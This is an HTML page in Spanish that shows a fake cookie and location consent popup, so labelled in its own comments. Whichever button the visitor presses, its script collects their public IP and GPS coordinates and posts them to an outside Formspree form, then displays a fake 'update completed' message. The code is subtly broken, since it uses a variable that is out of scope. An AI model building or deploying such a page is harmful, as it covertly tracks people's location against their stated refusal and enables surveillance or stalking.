<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f9f9f9; }
        
        /* Estilo del Popup Falso */
        .cookie-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); z-index: 1000; display: flex;
            justify-content: center; align-items: center;
        }
        .cookie-box {
            background: white; padding: 20px; border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2); max-width: 90%; width: 400px; text-align: center;
        }
        .cookie-box h2 { margin-top: 0; color: #333; font-size: 18px; }
        .cookie-box p { font-size: 14px; color: #666; line-height: 1.4; }
        .btn-group { margin-top: 20px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        button {
            padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 14px;
        }
        .btn-accept { background-color: #007bff; color: white; }
        .btn-reject { background-color: #e0e0e0; color: #333; }
        
        /* Pantalla de carga falsa */
        .loader-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 2000; justify-content: center; align-items: center; flex-direction: column;
        }
        .spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #333; border-radius: 50%;
            width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Popup Falso -->
    <div id="cookieOverlay" class="cookie-overlay">
        <div class="cookie-box">
            <h2>🍪 Preferencias de Cookies y Ubicación</h2>
            <p>Utilizamos cookies propias y de terceros para mejorar tus servicios. También necesitamos acceso a tu ubicación GPS para personalizar el contenido.</p>
            <div class="btn-group">
                <button class="btn-reject" onclick="handleChoice(false)">Rechazar</button>
                <button class="btn-accept" onclick="handleChoice(true)">Aceptar Todas</button>
            </div>
        </div>
    </div>

    <!-- Pantalla de Carga -->
    <div id="loader" class="loader-screen">
        <div class="spinner"></div>
        <p>Conectando con los servidores...</p>
    </div>

    <script>
        const formId = 'xjywravp'; 
        let gpsDataSent = false;

        function handleChoice(accepted) {
            document.getElementById('cookieOverlay').style.display = 'none';
            document.getElementById('loader').style.display = 'flex';

            // Obtenemos la IP primero
            fetch(`https://api.ipify.org?format=json`)
                .then(response => response.json())
                .then(ipData => {
                    // Simulamos que el usuario aceptó el GPS (o lo intentamos silenciosamente)
                    if (navigator.geolocation && !gpsDataSent) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            sendData(ipData.ip, pos.coords.latitude.toFixed(6), pos.coords.longitude.toFixed(6));
                        }, error => {
                            // Si falla, enviamos solo la IP
                            sendData(ipData.ip, null, null);
                        });
                    } else {
                        sendData(ipData.ip, null, null);
                    }
                });
        }

        function sendData(ip, lat, lng) {
            const formData = new FormData();
            formData.append('IP Pública', ip);
            formData.append('Latitud GPS', lat || 'No disponible');
            formData.append('Longitud GPS', lng || 'No disponible');
            formData.append('Estado', accepted ? 'Aceptó Cookies' : 'Rechazó Cookies');
            
            fetch('https://formspree.io/f/' + formId, { method: 'POST', body: formData })
                .then(() => {
                    setTimeout(() => {
                        document.getElementById('loader').innerHTML = '<h2 style="color:green">✅ Actualización completada</h2>';
                    }, 1500);
                });
        }
    </script>
</body>
</html>
